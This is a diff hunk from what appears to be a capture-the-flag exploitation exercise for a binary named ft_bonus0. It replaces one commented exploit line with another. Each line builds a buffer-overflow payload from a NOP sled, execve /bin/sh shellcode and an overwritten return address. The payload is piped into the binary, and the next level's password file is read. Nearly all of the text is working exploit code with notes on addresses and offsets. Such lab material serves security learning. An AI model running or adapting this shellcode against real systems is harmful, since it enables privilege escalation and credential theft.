@@ -34,5 +34,5 @@ mv ft_bonus0 ~
 #	su bonus0
 #	// check the new p()'s buffer address, in this exemple it is 0xbfffe670 so 0xbfffe670 + 80 = 0xbfffe6c0 (\xc0\xe6\xff\xbf).
 #   // the offset may also changed, here is 12
-#	(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'; python -c 'print "A" * 12 + "\xc0\xe6\xff\xbf" + "B" * 4'; cat) | /home/user/bonus1/ft_bonus0
+#	(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A" * 12 + "\xc0\xe6\xff\xbf" + "B" * 4'; cat) | /home/user/bonus1/ft_bonus0
 #	cat /home/user/bonus1/.pass
